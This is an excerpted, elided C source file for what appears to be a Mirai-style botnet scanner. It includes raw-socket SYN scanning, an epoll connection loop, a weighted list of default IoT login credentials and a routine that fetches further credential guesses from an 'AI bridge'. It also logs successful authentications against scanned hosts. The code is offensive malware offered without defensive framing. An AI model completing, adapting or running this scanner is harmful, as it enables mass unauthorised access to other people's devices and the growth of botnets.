...
static inline int epoll_create1(int f) {
  (void)f;
  return -1;
}
...
static int scanner_load_credentials(scanner_context_t *ctx,
...
static int scanner_create_connection(scanner_context_t *ctx,
                                     struct sockaddr_in *target);
static void scanner_handle_event(scanner_context_t *ctx,
                                 struct epoll_event *event);
static void scanner_close_connection(scanner_context_t *ctx,
                                     scanner_connection_t *conn);
static scanner_credential_t *
scanner_get_random_credential(scanner_context_t *ctx);
...
int scanner_modern_init(const char *config_path, size_t max_connections) {
  ...
  g_scanner->connections =
      calloc(max_connections, sizeof(scanner_connection_t));
...
cleanup_error:
  if (g_scanner->epoll_fd >= 0)
    close(g_scanner->epoll_fd);
...
static int scanner_init_raw_socket(scanner_context_t *ctx) {
  ...
  int one = 1;
  if (setsockopt(ctx->raw_socket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) <
      0) {
...
static int scanner_load_credentials(scanner_context_t *ctx,
  ...
  struct {
    ...
    uint16_t weight;
      ...
      {"root", "xc3511", 10}, {"root", "vizxv", 9},     {"root", "admin", 8},
      {"admin", "admin", 7},  {"root", "888888", 6},    {"root", "default", 5},
      {"root", "123456", 5},  {"admin", "password", 4}, {"root", "root", 4},
      {"user", "user", 3},    {NULL, NULL, 0}};

  ctx->credential_count = 0;
  ctx->total_credential_weight = 0;

  for (size_t i = 0;
       default_creds[i].user != NULL && i < SCANNER_CREDENTIAL_MAX; i++) {
  ...
  log_info("Loaded %zu credentials (total weight: %u)", ctx->credential_count,
           ctx->total_credential_weight);
...
void *scanner_modern_run(void *arg) {
    ...
    for (size_t i = 0; i < g_scanner->max_connections; i++) {
      ...
      if (conn->state != CONN_STATE_CLOSED) {
        if (now - conn->last_activity > SCANNER_CONN_TIMEOUT) {
          log_debug("Connection timeout: fd=%d, state=%d", conn->fd,
                    conn->state);
  ...
  log_info(
      "Final stats: syns=%lu, conns=%lu, success=%lu, failed=%lu, timeouts=%lu",
      g_scanner->stats.syns_sent, g_scanner->stats.connections_opened,
      g_scanner->stats.successful_auths, g_scanner->stats.failed_auths,
      g_scanner->stats.timeouts);
 ...
 */
static void on_synack_received(uint32_t src_ip, uint16_t src_port,
                               void *user_data) {
...
static int scanner_load_credentials_from_ai(scanner_context_t *ctx) {
  ...
  int count =
      ai_bridge_generate_credentials(&req, ai_creds, SCANNER_CREDENTIAL_MAX);
  if (count <= 0) {
  ...
  for (int i = 0; i < count && (size_t)i < SCANNER_CREDENTIAL_MAX; i++) {
    ...
    ctx->credentials[i].weight =
        (uint16_t)(ai_creds[i].confidence_score * 10.0f) + 1;
    ctx->credentials[i].active = true;
    ...
    if (conn->current_cred != NULL) {
      ...
      if (sm_result == 1) {
        ...
        log_info("Auth success: %s:%d user=%s",
                 inet_ntoa(conn->target.sin_addr), ntohs(conn->target.sin_port),
  ...
  if (event->events & EPOLLOUT) {
    ...
    if (conn->state == CONN_STATE_CONNECTING) {
      ...
      if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len) < 0 ||
          err != 0) {
        log_debug("Connect failed on fd=%d: %s", conn->fd,
      ...
      log_debug("Connected to %s:%d", inet_ntoa(conn->target.sin_addr),
